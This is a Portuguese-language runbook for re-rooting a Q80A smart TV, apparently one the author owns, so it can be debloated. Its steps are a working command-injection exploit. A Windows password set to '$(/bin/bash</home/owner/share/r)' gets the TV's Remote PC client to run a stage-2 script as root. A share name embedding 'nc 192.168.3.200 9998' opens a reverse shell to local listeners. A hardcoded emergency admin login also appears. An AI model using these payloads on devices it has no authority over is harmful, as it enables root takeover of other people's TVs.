# Kit de Re-root — Q80A

O stage-2 **já está na TV** em `/home/owner/share/r` (partição `/opt`, sobrevive reboot).
Re-root = repetir só a injeção. Tempo estimado: ~3 min.

## Pré-requisitos (uma vez só)

- TV e PC na mesma LAN (TV `192.168.3.191`, PC `192.168.3.200`)
- RDP habilitado no Windows — `setup-rdp.ps1` já configura
- Conta de emergência `tvrdp`/`Tv12345!` existe e é admin (testada na tela de login)
- Python no PC para os listeners

## Procedimento

### 1. Sobe os listeners (PC)

```powershell
cd C:\Users\rpf16\q80a_debloat\kit
start python listener.py   # 9998 shell + 9999 marcador
start python bridge.py     # 9997 controle <-> 9998
```

### 2. Define a senha-payload (PowerShell admin)

```powershell
$sec = ConvertTo-SecureString '$(/bin/bash</home/owner/share/r)' -AsPlainText -Force
Set-LocalUser -Name 'rpf16' -Password $sec
```

> Sua senha volta ao normal depois (passo 5). O PIN do Windows Hello continua funcionando.
> Se algo der errado: login local com `tvrdp`/`Tv12345!` e `Set-LocalUser rpf16` restaura.

### 3. Na TV

- Remote PC → perfil do PC (`192.168.3.200`, usuário `rpf16`)
- Edita a senha do perfil para: `$(/bin/bash</home/owner/share/r)` — exatamente, sem espaços
- Conecta → toolbar do topo → **Shared Folder**

### 4. Confirma

- `9999`: `STAGE2-OK` = injeção executou
- `9998`: `bash-3.2#` = shell root ativo
- Comandos: `python send-cmd.py "pkgcmd -l | head"` (ver `send-cmd.py`)

### 5. Depois de usar — restaura a senha e limpa

```powershell
$sec = ConvertTo-SecureString 'SUA_SENHA_NORMAL' -AsPlainText -Force
Set-LocalUser -Name 'rpf16' -Password $sec
Remove-SmbShare -Name 'x$(nc 192.168.3.200 9998)' -Force -ErrorAction SilentlyContinue
# Fecha os listeners (Ctrl+C nas janelas)
```

## Falhas conhecidas

| Sintoma | Causa | Fix |
|---|---|---|
| Shared Folder lista pastas mas nada chega | senha do perfil TV diferente da do Windows | re-digita a payload nos dois |
| `/bin/bash,-i` no listener | payload com espaço (vira vírgula) | usar só `$(/bin/bash<...)` |
| Nada na 9998 mas `uid=0` na 9999 | injeção OK, payload quebrado | confere o arquivo `r` na TV (`cat` via payload `$(cat>...)` não; re-push via SDB/dev mode) |
| Shell caiu | reboot/queda RDP | repetir do passo 3 |
| Lockout do Windows | senha-payload + sem fallback | `tvrdp`/`Tv12345!` na tela de login |

## Re-push do stage-2 (se a TV perder o arquivo `r`)

Com Developer Mode ativo (host `192.168.3.200`):

```powershell
cd C:\Users\rpf16\q80a_debloat\.tools\tvroot
python tvroot.py push ..\..\kit\stage2.sh /home/owner/share/r
```

(usa `sdb_wire.py` — SDB por TCP 26101, só push funciona)
